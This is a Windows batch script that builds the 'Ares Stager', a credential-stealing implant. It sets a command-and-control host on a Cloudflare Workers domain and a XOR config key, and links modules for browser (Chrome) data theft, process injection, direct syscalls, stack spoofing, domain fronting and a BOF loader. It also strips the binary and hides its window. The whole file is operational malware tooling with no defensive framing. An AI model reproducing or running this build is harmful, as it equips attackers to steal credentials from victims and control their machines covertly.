@echo off
cd /d C:\Users\Admin\.openclaw\workspace\Ares_Framework

if not exist build mkdir build

echo [*] Compiling resources...
windres agent/native/resources.rc -O coff -o build/resources.o 2>NUL

echo [*] Building Ares Stager (Cloudflare Worker C2)...
echo [*] Target: analytics-edge.ares-ops.workers.dev

gcc -Wall -O2 -s -mwindows -fno-ident ^
    -ffunction-sections -fdata-sections ^
    -Wno-format-truncation -Wno-stringop-truncation ^
    -Wno-unused-variable -Wno-unused-function ^
    -Wno-unused-but-set-variable ^
    -Wno-cpp -Wno-unknown-pragmas -Wno-format ^
    -DCFG_XOR_KEY=0xB3 ^
    -DARES_STAGER_STEAL ^
    -DARES_C2_CLOUDFLARE ^
    -DC2_WORKER_HOST=L"analytics-edge.ares-ops.workers.dev" ^
    -Wl,--gc-sections,--stack,4194304,--dynamicbase,--nxcompat ^
    -I. ^
    -o build/stager_cf.exe ^
    agent/native/stager.c ^
    agent/native/core.c ^
    agent/native/syscall.c ^
    agent/native/inject.c ^
    agent/native/stealer.c ^
    agent/native/chrome_v20.c ^
    agent/native/chrome_inject.c ^
    agent/native/bof_loader.c ^
    agent/native/domain_front.c ^
    agent/native/cap_loader.c ^
    agent/native/stack_spoof.c ^
    build/resources.o ^
    -lkernel32 -luser32 -lws2_32 -lgdi32 -luuid

if %ERRORLEVEL% EQU 0 (
    echo [+] BUILD SUCCESS: build\stager_cf.exe
    for %%A in (build\stager_cf.exe) do echo [+] Size: %%~zA bytes
) else (
    echo [!] BUILD FAILED
)
